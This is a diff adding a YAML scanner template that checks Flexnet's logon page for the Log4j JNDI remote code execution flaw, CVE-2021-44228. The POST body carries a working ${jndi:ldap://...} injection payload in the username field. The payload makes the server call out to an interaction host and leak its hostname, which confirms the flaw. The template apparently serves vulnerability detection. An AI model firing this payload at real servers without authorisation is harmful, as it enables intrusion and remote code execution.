@@ -1,0 +1,32 @@
+id: flexnet-log4j-rce
+brief:
+    title: Flexnet - Remote Code Execution (Apache Log4j)
+    by: shaikhyaser
+    level: critical
+    about: Flexnet is susceptible to Log4j JNDI remote code execution.
+    label:
+        - cve
+        - cve2021
+        - rce
+        - jndi
+        - log4j
+        - flexnet
+        - oast
+        - kev
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/flexnet/logon.do'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+        Origin: '{{RootURL}}'
+        Referer: '{{RootURL}}/flexnet/logon.do'
+      body: action=logon&username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&password={{str}}&domain=FLEXnet
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
